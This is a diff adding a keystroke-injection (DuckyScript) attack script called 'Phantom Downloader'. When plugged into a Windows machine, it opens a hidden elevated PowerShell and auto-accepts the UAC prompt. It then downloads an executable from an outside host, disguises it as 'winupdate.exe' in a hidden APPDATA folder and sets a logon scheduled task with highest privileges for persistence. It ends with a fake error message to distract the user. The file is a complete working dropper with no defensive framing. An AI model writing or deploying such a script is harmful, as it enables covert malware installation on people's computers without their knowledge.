@@ -1,0 +1,47 @@
+REM === Phantom Downloader Script ===
+DEFAULT_DELAY 100
+DELAY 1000
+
+REM Open Run prompt
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Verb RunAs
+ENTER
+DELAY 800
+
+REM Wait for UAC prompt and accept
+DELAY 2000
+ENTER
+DELAY 500
+
+REM Create hidden folder
+STRING New-Item -ItemType Directory -Path "$env:APPDATA\WinUpdate" -Force | Out-Null
+ENTER
+DELAY 200
+
+REM Download file (can be .exe, .bat, .vbs, etc.)
+STRING Invoke-WebRequest -Uri "https://hd.khaled.hackclub.app/downloads/hd.exe" -OutFile "$env:APPDATA\WinUpdate\winupdate.exe"
+ENTER
+DELAY 1500
+
+REM Create scheduled task for persistence with admin privileges
+STRING schtasks /create /sc ONLOGON /tn "WinUpdateTask" /tr "$env:APPDATA\WinUpdate\winupdate.exe" /rl HIGHEST /f
+ENTER
+DELAY 800
+
+REM Hide downloaded file and folder
+STRING attrib +h "$env:APPDATA\WinUpdate"
+ENTER
+DELAY 300
+STRING attrib +h "$env:APPDATA\WinUpdate\winupdate.exe"
+ENTER
+DELAY 300
+
+REM Display a fake error message to distract user
+STRING [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null; [System.Windows.Forms.MessageBox]::Show("System update failed to start.", "Error", 0, 16)
+ENTER
+DELAY 500
+
+REM Done. Close powershell
+STRING exit
+ENTER
